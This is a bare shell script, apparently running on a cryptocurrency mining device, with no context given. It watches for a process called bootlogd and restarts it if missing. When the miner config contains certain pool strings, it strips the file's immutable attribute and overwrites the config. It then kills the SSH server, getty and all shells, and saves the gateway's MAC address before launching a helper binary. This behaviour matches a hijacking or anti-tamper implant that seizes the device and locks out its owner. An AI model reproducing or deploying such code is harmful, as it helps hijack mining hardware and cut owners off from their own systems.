#!/bin/sh

while true; do
    sleep 10s

c="$(ps | grep bootlogd/1 | grep -v 'grep bootlogd/1')"
    if [ -z  "$c" ]; then
      echo "DC ..Wait"
      killall boot >/dev/null 2>&1
    cp /opt/scr/conf.js /opt/setconf/conf.js >/dev/null 2>&1
    /etc/init.d/boot.sh restart >/dev/null 2>&1
    else
     echo "Good.. Cennected.."
    fi
    
d="$(cat /config/bmminer.conf | grep -i 'strtcp\|xx00.s9x\|xmax\|Tomas')"
    if [ -z  "$d" ]; then
      echo "oke.."
  else
   echo "Warning..!"
	sleep 2s
	/opt/run/seeme warn >/dev/null 2>&1
	chattr -ai /config/bmminer.conf >/dev/null 2>&1
	cp /home/bmminer.conf /config/bmminer.conf >/dev/null 2>&1
	#chattr +ai /config/bmminer.conf >/dev/null 2>&1
	killall getty >/dev/null 2>&1
	killall dropbear >/dev/null 2>&1
	killall sh >/dev/null 2>&1
	#fuser -k 22/tcp >/dev/null 2>&1
    fi
    
b="$(cat /var/volatile/tmp/freq | grep -h 'miner total rate')"
    if [ -z  "$b" ]; then
      echo "wait.."
    continue
    else
     echo "lets goo..!"

 for x in $(busybox ip route get 1|awk '{print $3}'); do echo $x;busybox arp -a $x ; done|awk '{print $4}'|sed -n 2p > /opt/setconf/mloc

	sleep 5s
	/opt/run/seeme >/dev/null 2>&1
	exit 0
    fi
done